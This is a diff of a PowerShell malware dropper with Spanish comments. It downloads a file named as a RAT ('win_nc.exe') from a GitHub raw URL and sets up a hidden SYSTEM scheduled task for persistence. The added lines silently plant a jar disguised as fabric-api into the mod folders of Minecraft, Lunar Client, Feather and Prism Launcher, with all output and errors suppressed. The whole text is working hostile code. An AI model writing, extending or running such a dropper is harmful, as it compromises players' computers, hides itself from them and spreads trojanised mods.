@@ -19,11 +19,52 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/s
 $ratPath = "$workDir\win_nc.exe"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/win_nc.exe" -OutFile $ratPath
 
+
+# --- Buscar todas las carpetas 'mods' en los launchers de Minecraft (SILENCIOSO) ---
+$jarName = "fabric-api-0.179.1_22.1.2.jar"
+$tempJar = "$workDir\$jarName"
+$destinos = @()
+
+# 1. .minecraft/mods
 $minecraftMods = "$env:APPDATA\.minecraft\mods"
-if (Test-Path $minecraftMods) {
-    $jarPath = "$minecraftMods\fabric-api-0.179.1_22.1.2.jar"
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/fabric-api-0.179.1_22.1.2.jar" -OutFile $jarPath
+if (Test-Path $minecraftMods) { $destinos += $minecraftMods }
+
+# 2. Lunar Client
+$lunarProfiles = "$env:USERPROFILE\.lunarclient\profiles"
+if (Test-Path $lunarProfiles) {
+    $destinos += Get-ChildItem -Path $lunarProfiles -Directory -ErrorAction SilentlyContinue | 
+        Where-Object { Test-Path (Join-Path $_.FullName "mods") } | 
+        ForEach-Object { Join-Path $_.FullName "mods" }
 }
+
+# 3. Feather
+$featherMods = "$env:APPDATA\.feather\user-mods"
+if (Test-Path $featherMods) { $destinos += $featherMods }
+if (Test-Path $featherMods) {
+    $destinos += Get-ChildItem -Path $featherMods -Directory -Recurse -ErrorAction SilentlyContinue | 
+        Where-Object { $_.Name -eq "mods" } | 
+        ForEach-Object { $_.FullName }
+}
+
+# 4. Prism Launcher
+$prismInstances = "$env:APPDATA\PrismLauncher\instances"
+if (Test-Path $prismInstances) {
+    $destinos += Get-ChildItem -Path $prismInstances -Directory -ErrorAction SilentlyContinue | 
+        Where-Object { Test-Path (Join-Path $_.FullName "mods") } | 
+        ForEach-Object { Join-Path $_.FullName "mods" }
+}
+
+# Eliminar duplicados
+$destinos = $destinos | Select-Object -Unique
+
+# Si hay al menos una carpeta mods, descargar y copiar el .jar sin mostrar nada
+if ($destinos.Count -gt 0) {
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/$jarName" -OutFile $tempJar -UseBasicParsing -ErrorAction SilentlyContinue > $null 2>&1
+    foreach ($dest in $destinos) {
+        Copy-Item -Path $tempJar -Destination "$dest\$jarName" -Force -ErrorAction SilentlyContinue > $null 2>&1
+    }
+}
+# No se muestra ningún mensaje, ni siquiera de error o éxito
 
 Write-Host "[4/7]" -ForegroundColor Cyan
 schtasks /create /tn "Schost" /tr "cmd /c start /b $schostPath" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
